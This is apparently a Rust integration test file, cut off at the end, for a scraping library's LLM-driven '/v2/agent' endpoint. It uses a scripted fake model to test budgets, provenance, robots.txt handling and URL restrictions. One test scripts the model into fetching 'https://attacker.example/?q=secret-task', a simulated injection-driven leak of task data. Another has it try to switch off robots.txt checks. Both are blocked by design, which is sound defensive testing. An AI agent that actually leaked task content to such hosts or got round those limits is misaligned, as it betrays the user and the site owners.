//! 0.98 `/v2/agent`：模型用录制好的回复（本机假服务，OpenAI 兼容接口），搜索用假后端，网页用本机站点。
//! 覆盖规划、调工具、证据、字段来源、自适应停止、预算用尽、robots 拒绝、没配 LLM、取消、未知字段。

use std::collections::VecDeque;
use std::future::Future;
use std::pin::Pin;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use axum::Router;
use axum::body::Body;
use axum::extract::Path;
use axum::http::{Request, StatusCode};
use axum::response::Html;
use axum::routing::{get, post};
use http_body_util::BodyExt;
use pagesift::{Scraper, ScraperConfig};
use pagesift_search::{SearchBackend, SearchQuery, SearchResult};
use serde_json::{Value, json};
use tower::ServiceExt;

/// 本机站点：`/p/{slug}` 是内容页，`/private/*` 被 robots.txt 禁止。
fn site_page(slug: &str) -> String {
    let body = match slug {
        "founders" => {
            "<h1>Acme history</h1><p>Acme was founded in 1999 by Ada Lovelace in Oslo.</p>\
             <p>The founder Ada Lovelace still leads the Acme company today.</p>"
                .to_string()
        }
        "revenue" => "<h1>Acme results</h1><p>Acme revenue reached 1,234 million EUR in 2023.</p>"
            .to_string(),
        other => format!(
            "<h1>Page {other}</h1><p>Unrelated gardening advice about tomatoes number {other}.</p>"
        ),
    };
    format!("<html><head><title>Page {slug}</title></head><body><main>{body}</main></body></html>")
}

async fn serve(app: Router) -> String {
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}", l.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    url
}

async fn site() -> String {
    serve(
        Router::new()
            .route(
                "/robots.txt",
                get(|| async { "User-agent: *\nDisallow: /private/\n" }),
            )
            .route(
                "/p/{slug}",
                get(|Path(slug): Path<String>| async move { Html(site_page(&slug)) }),
            )
            .route(
                "/private/{slug}",
                get(|Path(slug): Path<String>| async move { Html(site_page(&slug)) }),
            ),
    )
    .await
}

/// 录制的模型：按调用顺序回复。记下每次的提示，好检查模型看到了什么。
#[derive(Clone)]
struct Model {
    url: String,
    prompts: Arc<Mutex<Vec<String>>>,
    calls: Arc<AtomicUsize>,
}

async fn model(replies: Vec<Value>) -> Model {
    model_with_usage(replies, None).await
}

async fn model_with_usage(replies: Vec<Value>, usage: Option<u64>) -> Model {
    let queue = Arc::new(Mutex::new(VecDeque::from(replies)));
    let prompts: Arc<Mutex<Vec<String>>> = Arc::default();
    let calls = Arc::new(AtomicUsize::new(0));
    let (q, p, c) = (queue, prompts.clone(), calls.clone());
    let app = Router::new()
        .route(
            "/v1/models/{m}",
            get(|| async {
                axum::Json(json!({"context_window": 32768, "max_completion_tokens": 4096}))
            }),
        )
        .route(
            "/v1/chat/completions",
            post(move |body: String| {
                let probe = body.contains("\"max_tokens\":1}") || body.contains("\"max_tokens\":1,");
                let content = if probe {
                    "{}".to_string()
                } else {
                    c.fetch_add(1, Ordering::SeqCst);
                    p.lock().unwrap().push(body);
                    q.lock()
                        .unwrap()
                        .pop_front()
                        .unwrap_or(json!({"action": "finish", "data": null, "missing": ["out of replies"]}))
                        .to_string()
                };
                let mut reply = json!({"choices": [{"message": {"role": "assistant", "content": content}, "finish_reason": "stop"}]});
                if let Some(u) = usage {
                    reply["usage"] = json!({"prompt_tokens": u, "completion_tokens": 0, "total_tokens": u});
                }
                async move { ([("x-ratelimit-limit-tokens", "1000000")], axum::Json(reply)) }
            }),
        );
    let url = serve(app).await;
    Model {
        url: format!("{url}/v1"),
        prompts,
        calls,
    }
}

struct Search(String);

impl SearchBackend for Search {
    fn name(&self) -> &'static str {
        "fixture"
    }

    fn search<'a>(
        &'a self,
        _q: &'a SearchQuery,
    ) -> Pin<Box<dyn Future<Output = pagesift_search::Result<Vec<SearchResult>>> + Send + 'a>> {
        let base = self.0.clone();
        Box::pin(async move {
            Ok(vec![SearchResult {
                url: format!("{base}/p/founders"),
                title: "Acme history".into(),
                description: "When Acme was founded".into(),
                position: 1,
            }])
        })
    }
}

fn scraper(llm: Option<&Model>, site: Option<&str>) -> Arc<Scraper> {
    let mut cfg = ScraperConfig::default();
    cfg.fetcher.env_proxy = false;
    cfg.fetcher.ssrf.allow_private_network = true;
    cfg.policy.rate.default_interval = Duration::from_millis(1);
    cfg.llm = llm.map(|m| pagesift_llm::LlmConfig::new(m.url.clone(), "fixture-model", None));
    cfg.search = site.map(|s| Arc::new(Search(s.to_string())) as Arc<dyn SearchBackend>);
    Arc::new(Scraper::new(cfg).unwrap())
}

async fn request(
    app: &Router,
    method: &str,
    path: &str,
    body: Option<Value>,
) -> (StatusCode, Value) {
    let req = Request::builder()
        .method(method)
        .uri(path)
        .header("content-type", "application/json")
        .body(match body {
            Some(b) => Body::from(b.to_string()),
            None => Body::empty(),
        })
        .unwrap();
    let resp = app.clone().oneshot(req).await.unwrap();
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    (
        status,
        serde_json::from_slice(&bytes).unwrap_or(Value::Null),
    )
}

/// 提交并等到结束（带证据全文）。
async fn run(app: &Router, body: Value) -> Value {
    let (status, started) = request(app, "POST", "/v2/agent", Some(body)).await;
    assert_eq!(status, StatusCode::OK, "{started}");
    let id = started["id"].as_str().unwrap().to_string();
    for _ in 0..500 {
        let (_, s) = request(
            app,
            "GET",
            &format!("/v2/agent/{id}?includeEvidence=true"),
            None,
        )
        .await;
        if s["status"] != "processing" {
            return s;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    }
    panic!("the agent run did not finish");
}

fn app(s: Arc<Scraper>) -> Router {
    pagesift::api::router(s, Default::default())
}

fn prompt_text(m: &Model, i: usize) -> String {
    let body: Value = serde_json::from_str(&m.prompts.lock().unwrap()[i]).unwrap();
    body["messages"][1]["content"].as_str().unwrap().to_string()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn plans_reads_and_reports_where_each_field_came_from() {
    let base = site().await;
    let llm = model(vec![
        json!({"action": "search", "query": "acme founder", "notes": "looking"}),
        json!({"action": "scrape", "urls": [format!("{base}/p/founders")], "query": "founder of acme",
               "notes": "Ada Lovelace founded Acme (E2)"}),
        json!({"action": "scrape", "urls": [format!("{base}/p/revenue")], "query": "acme revenue"}),
        json!({"action": "finish",
               "data": {"founder": "Ada Lovelace", "year": 1999, "revenue": "1,234 million EUR", "ceo": "Grace Hopper"},
               "sources": {"/founder": ["E2"], "/year": ["E3"], "/revenue": ["E3"], "/ceo": ["E2"]},
               "message": "done"}),
    ])
    .await;
    let a = app(scraper(Some(&llm), Some(&base)));
    let r = run(
        &a,
        json!({"prompt": "Who founded Acme, when, and what is its revenue?", "effort": "low",
               "schema": {"type": "object", "required": ["founder"], "properties": {"founder": {"type": "string"}}}}),
    )
    .await;

    assert_eq!(r["status"], "completed", "{r}");
    assert_eq!(r["success"], true);
    assert_eq!(r["finishReason"], "answered");
    assert_eq!(r["complete"], true);
    assert_eq!(r["effort"], "low");
    assert_eq!(r["data"]["founder"], "Ada Lovelace");
    assert!(r.get("stopReason").is_none() && r.get("partial").is_none());
    assert!(r["expiresAt"].as_str().unwrap().ends_with('Z'), "{r}");

    // 工具调用：一次搜索、两页；额度 = 1 + 2
    assert_eq!(r["usage"]["searches"], 1);
    assert_eq!(r["usage"]["pages"], 2);
    assert_eq!(r["usage"]["llmCalls"], 4);
    assert_eq!(r["usage"]["tokensEstimated"], true, "假服务不报用量");
    assert!(r["usage"]["tokens"].as_u64().unwrap() > 0);
    assert_eq!(r["creditsUsed"], 3);
    let tools: Vec<&str> = r["steps"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["tool"].as_str().unwrap())
        .collect();
    assert_eq!(tools, ["search", "scrape", "scrape"]);

    // 证据存档：搜索摘要和两页；每页只留下和查询相关的文字
    let evidence = r["evidence"].as_array().unwrap();
    assert_eq!(evidence.len(), 3, "{evidence:?}");
    assert_eq!(evidence[0]["kind"], "search");
    assert_eq!(evidence[1]["kind"], "page");
    assert!(
        evidence[1]["text"]
            .as_str()
            .unwrap()
            .contains("Ada Lovelace")
    );
    assert!(r["sources"].as_array().unwrap().iter().any(|s| {
        s["url"] == format!("{base}/p/founders")
            && s["contentHash"].is_string()
            && s["fetchedAt"].is_string()
    }));

    // 字段来源：引用错的被改正，哪里都没有的如实标成未核实
    let f = &r["fieldSources"];
    assert_eq!(
        f["/founder"]["sources"],
        json!([format!("{base}/p/founders")])
    );
    assert_eq!(f["/founder"]["verified"], true);
    assert_eq!(
        f["/year"]["sources"],
        json!([format!("{base}/p/founders")]),
        "模型引用了 E3，1999 其实在 E2"
    );
    assert_eq!(f["/revenue"]["verified"], true);
    assert_eq!(f["/ceo"]["verified"], false);
    assert!(
        r["warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|w| w == "agent_unverified_fields: /ceo"),
        "{r}"
    );

    // 模型每轮看到的：候选和新证据；旧证据不再放，靠自己的笔记
    let second = prompt_text(&llm, 1);
    assert!(second.contains("/p/founders"), "{second}");
    let third = prompt_text(&llm, 2);
    assert!(
        third.contains("[E2]") && third.contains("Ada Lovelace founded Acme (E2)"),
        "{third}"
    );
    let fourth = prompt_text(&llm, 3);
    assert!(
        fourth.contains("[E3]") && !fourth.contains("[E2]"),
        "{fourth}"
    );
    // 不走 json_schema，只要求 JSON 对象；max_tokens 不超过模型的输出上限
    let first: Value = serde_json::from_str(&llm.prompts.lock().unwrap()[0]).unwrap();
    assert_eq!(first["response_format"]["type"], "json_object");
    assert!(first["max_tokens"].as_u64().unwrap() <= 4096);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn stops_when_new_pages_add_nothing_and_effort_only_changes_the_caps() {
    let base = site().await;
    // 模型一直想再读，读到的都是无关页：先有收获，然后判据（saturated）逼它回答
    let mut replies = vec![json!({"action": "scrape", "urls": [format!("{base}/p/founders")]})];
    for i in 0..30 {
        replies.push(json!({"action": "scrape", "urls": [format!("{base}/p/g{i}")]}));
    }
    let llm = model(replies).await;
    let a = app(scraper(Some(&llm), None));
    let r = run(
        &a,
        json!({"prompt": "Who founded the Acme company?", "urls": [format!("{base}/p/founders")], "effort": "high"}),
    )
    .await;
    // 第 7 次回复还想调工具：被要求回答，第二次仍不回答就是失败（录制的模型不听话）
    assert_eq!(r["status"], "failed", "{r}");
    assert!(r["error"].as_str().unwrap().contains("not usable"), "{r}");
    // 1 页有收获 + patience（5）页无关就停，没有用到 high 的 80 页
    assert_eq!(r["usage"]["pages"], 6, "{r}");
    assert_eq!(r["budget"]["maxPages"], 80);

    // 听话的模型：判据触发后回答，状态是 completed，原因是判据
    let mut replies = vec![json!({"action": "scrape", "urls": [format!("{base}/p/founders")]})];
    for i in 0..5 {
        replies.push(json!({"action": "scrape", "urls": [format!("{base}/p/h{i}")]}));
    }
    replies.push(json!({"action": "finish", "data": {"founder": "Ada Lovelace"}, "sources": {"/founder": ["E1"]}}));
    let llm = model(replies).await;
    let a = app(scraper(Some(&llm), None));
    let r = run(
        &a,
        json!({"prompt": "Who founded the Acme company?", "urls": [format!("{base}/p/founders")]}),
    )
    .await;
    assert_eq!(r["status"], "completed", "{r}");
    assert_eq!(r["finishReason"], "saturated", "{r}");
    assert_eq!(r["complete"], true);
    assert_eq!(r["budget"]["maxPages"], 20, "默认 medium");
    let last = prompt_text(&llm, 6);
    assert!(
        last.contains("No more tools: new pages stopped adding relevant information"),
        "{last}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn budget_exhaustion_is_reported_as_incomplete() {
    let base = site().await;
    // low = 5 页：一次请求 7 页只读 5 页；回答有缺失 → failed + credit_limit_reached + partial
    let urls: Vec<String> = (0..7).map(|i| format!("{base}/p/b{i}")).collect();
    let llm = model(vec![
        json!({"action": "scrape", "urls": urls, "query": "tomatoes"}),
        json!({"action": "finish", "data": {"founder": null}, "missing": ["the founder"], "message": "not on these pages"}),
    ])
    .await;
    let a = app(scraper(Some(&llm), None));
    let r = run(
        &a,
        json!({"prompt": "Who founded Acme?", "urls": [format!("{base}/p/b0")], "effort": "low",
               "schema": {"type": "object"}}),
    )
    .await;
    assert_eq!(r["status"], "failed", "{r}");
    assert_eq!(r["success"], false);
    assert_eq!(r["stopReason"], "credit_limit_reached");
    assert_eq!(r["budget"]["exhausted"], "pages");
    assert_eq!(r["usage"]["pages"], 5);
    assert_eq!(r["finishReason"], "budget_exhausted");
    assert!(r.get("data").is_none(), "failed 时没有 data：{r}");
    assert_eq!(r["partial"], json!({"founder": null}));
    assert_eq!(r["partialSchemaValid"], true);
    assert_eq!(r["message"], "not on these pages");
    assert_eq!(r["missing"], json!(["the founder"]));
    assert!(
        r["error"].as_str().unwrap().contains("budget (pages)"),
        "{r}"
    );
    assert!(
        r["warnings"].as_array().unwrap().iter().any(|w| w
            .as_str()
            .unwrap()
            .starts_with("agent_incomplete: missing: the founder")),
        "{r}"
    );
    let forced = prompt_text(&llm, 1);
    assert!(
        forced.contains("No more tools: the budget is used up"),
        "{forced}"
    );
    assert!(
        forced.contains("budget: these URLs were not read"),
        "{forced}"
    );

    // maxCredits 比 effort 的上限小时先到；模型答全了而且核实得了就不算不完整
    let llm = model(vec![
        json!({"action": "scrape", "urls": [format!("{base}/p/founders")], "query": "founder"}),
        json!({"action": "finish", "data": {"founder": "Ada Lovelace"}, "sources": {"/founder": ["E1"]}}),
    ])
    .await;
    let a = app(scraper(Some(&llm), None));
    let r = run(
        &a,
        json!({"prompt": "Who founded Acme?", "urls": [format!("{base}/p/founders")], "maxCredits": 1}),
    )
    .await;
    assert_eq!(r["status"], "completed", "{r}");
    assert_eq!(r["creditsUsed"], 1);
    assert_eq!(r["budget"]["maxCredits"], 1);
    assert!(r["budget"]["exhausted"].is_null());

    // token 预算：服务报的用量远超估计，用尽后不再调用模型，如实只留证据
    let llm = model_with_usage(
        vec![json!({"action": "scrape", "urls": [format!("{base}/p/founders")]})],
        Some(100_000_000),
    )
    .await;
    let a = app(scraper(Some(&llm), None));
    let r = run(
        &a,
        json!({"prompt": "Who founded Acme?", "urls": [format!("{base}/p/founders")]}),
    )
    .await;
    assert_eq!(r["status"], "failed", "{r}");
    assert_eq!(r["budget"]["exhausted"], "tokens");
    assert_eq!(r["usage"]["tokensEstimated"], false);
    assert_eq!(llm.calls.load(Ordering::SeqCst), 1);
    assert!(r.get("partial").is_none());
    assert!(
        r["message"].as_str().unwrap().contains("only the evidence"),
        "{r}"
    );
    assert_eq!(r["evidence"].as_array().unwrap().len(), 1);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn robots_is_respected_and_reported() {
    let base = site().await;
    let hidden = format!("{base}/private/founders");
    let llm = model(vec![
        // 模型想读被禁止的页面；工具里也没有关 robots 的办法
        json!({"action": "scrape", "urls": [hidden.clone()], "query": "founder", "ignoreRobotsTxt": true}),
        json!({"action": "scrape", "urls": [hidden.clone()], "query": "founder"}),
        json!({"action": "finish", "data": null, "missing": ["the founder"]}),
    ])
    .await;
    let a = app(scraper(Some(&llm), None));
    let r = run(
        &a,
        json!({"prompt": "Who founded Acme?", "urls": [hidden.clone()]}),
    )
    .await;
    assert_eq!(r["status"], "completed", "{r}");
    assert_eq!(r["complete"], false);
    assert_eq!(r["usage"]["pages"], 0);
    assert_eq!(r["creditsUsed"], 0);
    assert_eq!(r["evidence"].as_array().unwrap().len(), 0);
    assert_eq!(r["steps"][0]["result"], "ROBOTS_DISALLOWED", "{r}");
    let warnings: Vec<&str> = r["warnings"]
        .as_array()
        .unwrap()
        .iter()
        .map(|w| w.as_str().unwrap())
        .collect();
    assert!(
        warnings.contains(&format!("agent_robots_disallowed: {hidden}").as_str()),
        "{warnings:?}"
    );
    assert!(
        warnings.iter().any(|w| w.starts_with("agent_incomplete")),
        "{warnings:?}"
    );
    let second = prompt_text(&llm, 1);
    assert!(second.contains("disallowed by robots.txt"), "{second}");
    // 第二次请求同一个网址：已经拒绝过，不再抓
    let third = prompt_text(&llm, 2);
    assert!(third.contains("was already read"), "{third}");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn without_an_llm_or_search_the_request_is_refused_up_front() {
    let base = site().await;
    let a = app(scraper(None, Some(&base)));
    let (status, r) = request(&a, "POST", "/v2/agent", Some(json!({"prompt": "x"}))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{r}");
    assert_eq!(r["code"], "UNSUPPORTED_OPTION");
    assert_eq!(r["error"], "agent needs an LLM: set [llm] in pagesift.toml");

    let llm = model(vec![]).await;
    let a = app(scraper(Some(&llm), None));
    let (status, r) = request(&a, "POST", "/v2/agent", Some(json!({"prompt": "x"}))).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{r}");
    assert!(r["error"].as_str().unwrap().contains("[search]"), "{r}");
    assert_eq!(llm.calls.load(Ordering::SeqCst), 0);

    // 请求本身不合法
    for bad in [
        json!({"prompt": " "}),
        json!({"prompt": "x", "urls": [format!("{base}/p/a")], "schema": []}),
        json!({"prompt": "x", "strictConstrainToURLs": true}),
        json!({"prompt": "x", "urls": [format!("{base}/p/a")], "effort": "max"}),
        json!({"prompt": "x", "urls": [format!("{base}/p/a")], "maxCredits": 0}),
        json!({"prompt": "y".repeat(10_001), "urls": [format!("{base}/p/a")]}),
    ] {
        let (status, r) = request(&a, "POST", "/v2/agent", Some(bad.clone())).await;
        assert_eq!(status, StatusCode::BAD_REQUEST, "{bad} -> {r}");
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn constraints_unknown_fields_corrections_and_cancel() {
    let base = site().await;
    let allowed = format!("{base}/p/founders");
    let llm = model(vec![
        // 不是动作：纠正一次
        json!("this is not an action"),
        // 名单外的网址被拒绝，名单内的照读
        json!({"action": "scrape", "urls": [format!("{base}/p/revenue"), allowed.clone()], "query": "founder"}),
        // 严格模式下没有 search：纠正一次
        json!({"action": "search", "query": "acme"}),
        json!({"action": "scrape", "urls": [allowed.clone()], "query": "founder"}),
        // 不符合 schema：纠正一次
        json!({"action": "finish", "data": {"founder": 1}, "sources": {"/founder": ["E1"]}}),
        json!({"action": "finish", "data": {"founder": "Ada Lovelace"}, "sources": {"/founder": ["E1"]}}),
    ])
    .await;
    let a = app(scraper(Some(&llm), Some(&base)));
    let (status, started) = request(
        &a,
        "POST",
        "/v2/agent",
        Some(json!({
            "prompt": "Who founded Acme?",
            "urls": [allowed.clone()],
            "strictConstrainToURLs": true,
            "schema": {"type": "object", "properties": {"founder": {"type": "string"}}},
            "model": "spark-2",
            "threadId": "t",
            "origin": "sdk",
        })),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{started}");
    assert_eq!(
        started["warnings"],
        json!(["ignored_fields: model, threadId"])
    );
    let id = started["id"].as_str().unwrap().to_string();
    let r = loop {
        let (_, s) = request(&a, "GET", &format!("/v2/agent/{id}"), None).await;
        if s["status"] != "processing" {
            break s;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    };
    assert_eq!(r["status"], "completed", "{r}");
    assert_eq!(r["data"]["founder"], "Ada Lovelace");
    assert_eq!(r["usage"]["pages"], 1, "{r}");
    assert_eq!(r["usage"]["searches"], 0);
    assert_eq!(r["usage"]["llmCalls"], 6);
    assert!(
        r["warnings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|w| w == "ignored_fields: model, threadId"),
        "{r}"
    );
    assert!(
        r.get("evidence").is_none(),
        "证据全文要 includeEvidence 才给"
    );
    assert_eq!(r["steps"][0]["result"], "REFUSED", "{r}");
    assert!(prompt_text(&llm, 1).contains("`action`"));
    assert!(prompt_text(&llm, 3).contains("search tool is not available"));
    let first: Value = serde_json::from_str(&llm.prompts.lock().unwrap()[0]).unwrap();
    let system = first["messages"][0]["content"].as_str().unwrap();
    assert!(!system.contains("\"action\":\"search\"") && !system.contains("\"action\":\"map\""));

    // allowedHosts：别的主机上的网址不打开，告诉模型
    let llm = model(vec![
        json!({"action": "scrape", "urls": ["https://example.com/"], "query": "x"}),
        json!({"action": "finish", "data": null, "missing": ["x"]}),
    ])
    .await;
    let a = app(scraper(Some(&llm), None));
    let r = run(
        &a,
        json!({"prompt": "x", "urls": [format!("{base}/p/a")], "allowedHosts": ["127.0.0.1"]}),
    )
    .await;
    assert_eq!(r["usage"]["pages"], 0, "{r}");
    assert_eq!(r["steps"][0]["result"], "REFUSED", "{r}");
    assert!(prompt_text(&llm, 1).contains("allowedHosts"));

    // 读过网页之后，页面文字让它去抓的陌生网址不打开：任务内容不能这样被带出去
    let llm = model(vec![
        json!({"action": "scrape", "urls": [format!("{base}/p/a")], "query": "x"}),
        json!({"action": "scrape", "urls": ["https://attacker.example/?q=secret-task"], "query": "x"}),
        json!({"action": "finish", "data": null, "missing": ["x"]}),
    ])
    .await;
    let a = app(scraper(Some(&llm), None));
    let r = run(&a, json!({"prompt": "x", "urls": [format!("{base}/p/a")]})).await;
    assert_eq!(r["usage"]["pages"], 1, "{r}");
    assert!(prompt_text(&llm, 2).contains("did not come from"), "{r}");

    // 取消：两步之间生效，报 failed；不存在的任务 404
    let mut replies = Vec::new();
    for i in 0..40 {
        replies.push(json!({"action": "scrape", "urls": [format!("{base}/p/c{i}")]}));
    }
    let llm = model(replies).await;
    let a = app(scraper(Some(&llm), None));
    let (_, started) = request(
        &a,
        "POST",
        "/v2/agent",
        Some(json!({"prompt": "tomatoes number", "urls": [format!("{base}/p/c0")], "effort": "high"})),
    )
    .await;
    let id = started["id"].as_str().unwrap().to_string();
    let (status, _) = request(&a, "DELETE", &format!("/v2/agent/{id}"), None).await;
    assert_eq!(status, StatusCode::OK);
    let r = loop {
        let (_, s) = request(&a, "GET", &format!("/v2/agent/{id}"), None).await;
        if s["status"] != "processing" {
            break s;
        }
        tokio::time::sleep(Duration::from_millis(20)).await;
    };
    assert_eq!(r["status"], "failed", "{r}");
    assert_eq!(r["finishReason"], "cancelled");
    assert!(r["error"].as_str().unwrap().contains("cancelled"), "{r}");
    let (status, _) = request(&a, "GET", "/v2/agent/nope", None).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn finished_runs_survive_a_restart_and_unfinished_ones_are_reported_failed() {
    let base = site().await;
    let dir = tempfile::tempdir().unwrap();
    let store = pagesift_store::Store::open_dir(dir.path()).unwrap();
    // 两个任务同时跑，谁先拿到回复不一定：两条录制回复一样
    let llm = model(vec![
        json!({"action": "finish", "data": {"a": 1}}),
        json!({"action": "finish", "data": {"a": 1}}),
    ])
    .await;
    let config = || pagesift::api::Config {
        store: Some(store.clone()),
        ..Default::default()
    };
    let a = pagesift::api::router(scraper(Some(&llm), None), config());
    let (_, started) = request(
        &a,
        "POST",
        "/v2/agent",
        Some(json!({"prompt": "x", "urls": [format!("{base}/p/a")]})),
    )
    .await;
    let first = started["id"].as_str().unwrap().to_string();
    let (_, started) = request(
        &a,
        "POST",
        "/v2/agent",
        Some(json!({"prompt": "x", "urls": [format!("{base}/p/a")]})),
    )
    .await;
    assert_eq!(store.tasks().kv_keys("agent/").unwrap().len(), 2);
    // 把第二个任务的记录改回“跑到一半”，相当于进程在运行时被杀
    let id = started["id"].as_str().unwrap();
    tokio::time::sleep(Duration::from_millis(200)).await;
    let key = format!("agent/{id}");
    let mut saved: Value =
        serde_json::from_slice(&store.tasks().kv_get(&key).unwrap().unwrap()).unwrap();
    saved["status"] = json!("processing");
    saved["outcome"] = Value::Null;
    store
        .tasks()
        .kv_put(&key, &serde_json::to_vec(&saved).unwrap())
        .unwrap();

    let a = pagesift::api::router(scraper(Some(&llm), None), config());
    let (_, s) = request(&a, "GET", &format!("/v2/agent/{id}"), None).await;
    assert_eq!(s["status"], "failed", "{s}");
    assert!(s["error"].as_str().unwrap().contains("restarted"), "{s}");
    // 跑完的任务重启后照样能查
    let (_, s) = request(&a, "GET", &format!("/v2/agent/{first}"), None).await;
    assert_eq!(s["status"], "completed", "{s}");
    assert_eq!(s["data"], json!({"a": 1}));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn webhook_events_follow_firecrawl() {
    let base = site().await;
    let got: Arc<Mutex<Vec<Value>>> = Arc::default();
    let g = got.clone();
    let hook = serve(Router::new().route(
        "/hook",
        post(move |axum::Json(v): axum::Json<Value>| {
            g.lock().unwrap().push(v);
            async { "ok" }
        }),
    ))
    .await;
    let llm = model(vec![
        json!({"action": "scrape", "urls": [format!("{base}/p/founders")], "query": "founder"}),
        json!({"action": "finish", "data": {"founder": "Ada Lovelace"}, "sources": {"/founder": ["E1"]}}),
    ])
    .await;
    let mut config = pagesift::api::Config::default();
    config.webhook.ssrf.allow_ips = vec!["127.0.0.1".parse().unwrap()];
    let a = pagesift::api::router(scraper(Some(&llm), None), config);
    let r = run(
        &a,
        json!({"prompt": "Who founded Acme?", "urls": [format!("{base}/p/founders")],
               "webhook": {"url": format!("{hook}/hook"), "metadata": {"k": "v"}, "events": ["agent.started", "action", "completed"]}}),
    )
    .await;
    assert_eq!(r["status"], "completed", "{r}");
    let mut types = Vec::new();
    for _ in 0..200 {
        types = got
            .lock()
            .unwrap()
            .iter()
            .map(|v| v["type"].as_str().unwrap().to_string())
            .collect();
        if types.len() >= 3 {
            break;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    types.sort();
    assert_eq!(types, ["agent.action", "agent.completed", "agent.started"]);
    let events = got.lock().unwrap().clone();
    let done = events
        .iter()
        .find(|v| v["type"] == "agent.completed")
        .unwrap();
    assert_eq!(done["success"], true);
    assert_eq!(done["metadata"], json!({"k": "v"}));
    assert_eq!(done["data"][0]["data"]["founder"], "Ada Lovelace");
    let action = events.iter().find(|v| v["type"] == "agent.action").unwrap();
    assert_eq!(action["data"][0]["creditsUsed"], 1);

    // 不认识的事件名
    let (status, r) = request(
        &a,
        "POST",
        "/v2/agent",
        Some(json!({"prompt": "x", "urls": [format!("{base}/p/a")],
                    "webhook": {"url": format!("{hook}/hook"), "events": ["page"]}})),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{r}");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn mcp_lists_the_agent_only_with_an_llm() {
    let names = |s: Arc<Scraper>| -> Vec<String> {
        pagesift::mcp::tools(s)
            .iter()
            .map(|t| t.definition().name.to_string())
            .collect()
    };
    let none = names(scraper(None, None));
    assert!(!none.iter().any(|n| n == "pagesift_agent"), "{none:?}");
    let llm = model(vec![]).await;
    let some = names(scraper(Some(&llm), None));
    assert!(some.iter().any(|n| n == "pagesift_agent"), "{some:?}");
    assert!(
        some.iter().any(|n| n == "pagesift_agent_status"),
        "{some:?}"
    );
}

#[test]
fn cli_runs_the_same_loop_and_says_what_is_missing() {
    use std::process::Command;
    let dir = tempfile::tempdir().unwrap();
    let toml = dir.path().join("pagesift.toml");
    std::fs::write(&toml, "[cache]\nenabled = false\n").unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_pagesift"))
        .args([
            "--config",
            toml.to_str().unwrap(),
            "agent",
            "who founded acme",
        ])
        .output()
        .unwrap();
    assert!(!out.status.success());
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(
        err.contains("agent needs an LLM: set [llm] in pagesift.toml"),
        "{err}"
    );

    // 录制的模型 + 本机站点：stdout 是和 GET /v2/agent/{id} 相同的 JSON
    let rt = tokio::runtime::Runtime::new().unwrap();
    let (base, llm) = rt.block_on(async {
        let base = site().await;
        let llm = model(vec![
            json!({"action": "scrape", "urls": [format!("{base}/p/founders")], "query": "founder"}),
            json!({"action": "finish", "data": {"founder": "Ada Lovelace"}, "sources": {"/founder": ["E1"]}}),
        ])
        .await;
        (base, llm)
    });
    std::fs::write(
        &toml,
        format!(
            "[cache]\nenabled = false\n[llm]\nbase_url = \"{}\"\nmodel = \"fixture\"\n",
            llm.url
        ),
    )
    .unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_pagesift"))
        .args([
            "--config",
            toml.to_str().unwrap(),
            "agent",
            "who founded acme",
            "--effort",
            "low",
        ])
        .args([
            "--urls",
            &format!("{base}/p/founders"),
            "--allow-cidr",
            "127.0.0.0/8",
        ])
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        out.status.success(),
        "{stdout} {}",
        String::from_utf8_lossy(&out.stderr)
    );
    let v: Value = serde_json::from_str(&stdout).unwrap();
    assert_eq!(v["status"], "completed");
    assert_eq!(v["data"]["founder"], "Ada Lovelace");
    assert_eq!(v["fieldSources"]["/founder"]["verified"], true);
    assert_eq!(v["budget"]["maxPages"], 5);
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(err.contains("turn 1: scrape"), "{err}");
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_run_is_visible_only_to_the_key_that_started_it() {
    let base = site().await;
    let llm = model(vec![json!({"action": "finish", "data": {"a": 1}})]).await;
    let config = pagesift::api::Config {
        api_keys: vec!["key-a".into(), "key-b".into()],
        ..Default::default()
    };
    let a = pagesift::api::router(scraper(Some(&llm), None), config);
    let call = |method: &'static str, path: String, key: &'static str, body: Option<Value>| {
        let a = a.clone();
        async move {
            let req = Request::builder()
                .method(method)
                .uri(path)
                .header("authorization", format!("Bearer {key}"))
                .header("content-type", "application/json")
                .body(body.map_or(Body::empty(), |b| Body::from(b.to_string())))
                .unwrap();
            let resp = a.oneshot(req).await.unwrap();
            let status = resp.status();
            let bytes = resp.into_body().collect().await.unwrap().to_bytes();
            (
                status,
                serde_json::from_slice::<Value>(&bytes).unwrap_or(Value::Null),
            )
        }
    };
    let (_, started) = call(
        "POST",
        "/v2/agent".into(),
        "key-a",
        Some(json!({"prompt": "x", "urls": [format!("{base}/p/a")]})),
    )
    .await;
    let id = started["id"].as_str().unwrap();
    let path = format!("/v2/agent/{id}");
    assert_eq!(
